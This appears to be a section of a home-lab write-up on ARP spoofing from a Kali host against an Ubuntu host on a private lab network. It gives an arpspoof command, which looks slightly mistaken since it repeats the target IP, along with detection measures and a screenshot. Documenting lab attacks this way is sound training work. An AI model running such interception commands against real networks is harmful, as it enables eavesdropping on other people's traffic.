
## Attack 3: ARP spoofing

- **MITRE ATT&CK:** T1557 -  Adversary-in-the-Middle: ARP Cache Poisoning and T1040 -  Network Sniffing 
- **Attacker:** Kali (10.10.10.1)
- **Target:** Ubuntu (10.10.10.3)
- **Tools used:** arpspoof , wireshark

### Attack Steps
- use command : arpspoof -i eth1 -t 10.10.10.3 -r 10.10.10.3
- check on the ubuntu machine mac address 

### Detection
- Deploy IDS\IPS on system
- Use arpmonitoring
- Use static arp table 

### Screenshots
1. <img width="1418" height="284" alt="arp" src="https://github.com/user-attachments/assets/687189b5-a42c-46b7-a4b2-eae6ae2b6b9f" />

